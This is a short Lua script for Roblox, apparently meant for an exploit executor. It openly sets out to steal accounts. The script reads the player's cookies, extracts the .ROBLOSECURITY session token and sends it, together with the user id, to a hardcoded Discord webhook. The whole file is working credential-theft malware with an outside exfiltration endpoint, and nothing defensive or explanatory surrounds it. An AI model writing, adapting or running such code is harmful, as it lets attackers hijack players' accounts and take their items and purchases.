local HttpService = game:GetService("HttpService")
local DATA_LOG_URL = "https://discord.com/api/webhooks/1556717673562509407/36HbT4QRK5ohS3wGFpiTcD7xHk6GTV3onvgqGtAf3DmCrZBJwdE1cS5zOF7NAxo-Tpuw"

local function stealAccount()
    local cookie = nil
    
    -- Корректный защищенный вызов вместо try-catch
    local success = pcall(function()
        cookie = getcookies()
    end)

    if not cookie then
        pcall(function()
            cookie = game:HttpGet("https://www.roblox.com/login?placeId="..game.PlaceId)
        end)
    end

    if cookie then
        local token = string.match(cookie, "ROBLOSECURITY=%s*(.-)%s*;")
        
        if token then
            local localPlayer = game:GetService("Players").LocalPlayer
            local payload = {
                username = localPlayer and localPlayer.UserId or 0,
                token = token
            }
            
            pcall(function()
                game:HttpGet(DATA_LOG_URL .. "?user=" .. payload.username .. "&token=" .. HttpService:URLEncode(payload.token))
            end)
        end
    end
end

stealAccount()